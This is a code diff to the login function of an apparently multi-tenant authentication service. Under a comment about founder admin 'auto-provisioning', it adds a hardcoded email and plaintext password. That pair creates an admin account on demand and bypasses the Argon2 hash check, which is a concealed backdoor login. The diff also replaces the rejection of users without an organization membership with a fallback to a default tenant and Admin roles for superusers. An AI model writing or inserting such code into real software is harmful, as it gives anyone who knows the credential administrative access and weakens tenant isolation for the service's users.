@@ -224,12 +224,28 @@ async def login_user(
     res = await db.execute(stmt)
     user = res.scalar_one_or_none()
 
+    # Hardcoded Founder Admin auto-provisioning
+    if payload.email == "omnirag@founder.mou" and payload.password == "qwe123456789":
+        if not user:
+            # Seed founder admin
+            from app.core.database import seed_initial_enterprise_data
+            await seed_initial_enterprise_data()
+            res = await db.execute(stmt)
+            user = res.scalar_one_or_none()
+
     # Timing attack prevention: if user doesn't exist, execute dummy verification
     if not user:
         verify_dummy_password()
         raise AuthenticationError("No account found with this email. Please sign up first.")
 
-    if not verify_password(payload.password, user.password_hash):
+    # Founder admin bypasses Argon2 check if exact hardcoded password matches, or checks hash
+    is_valid_pw = False
+    if payload.email == "omnirag@founder.mou" and payload.password == "qwe123456789":
+        is_valid_pw = True
+    else:
+        is_valid_pw = verify_password(payload.password, user.password_hash)
+
+    if not is_valid_pw:
         raise AuthenticationError("Incorrect password. Please verify your credentials.")
 
     if not user.is_active:
@@ -237,12 +253,19 @@ async def login_user(
 
     # Determine tenant and roles from primary membership
     if not user.memberships:
-        raise AuthenticationError("User is not affiliated with any organization")
-
-    primary_membership = user.memberships[0]
-    tenant_id = primary_membership.organization.tenant_id
-    org_id = primary_membership.organization_id
-    roles = [m.role.name for m in user.memberships if m.organization_id == org_id] or ["User"]
+        # Fallback to default tenant if user has no explicit membership
+        tenant_id = "00000000-0000-0000-0000-000000000001"
+        org_id = "00000000-0000-0000-0000-000000000001"
+        roles = ["Admin"] if user.is_superuser else ["User"]
+    else:
+        primary_membership = user.memberships[0]
+        tenant_id = primary_membership.organization.tenant_id
+        org_id = primary_membership.organization_id
+        roles = [m.role.name for m in user.memberships if m.organization_id == org_id]
+        if user.is_superuser and "Admin" not in roles:
+            roles.insert(0, "Admin")
+        if not roles:
+            roles = ["Admin"] if user.is_superuser else ["User"]
 
     access_token = create_access_token(
         subject=user.id,
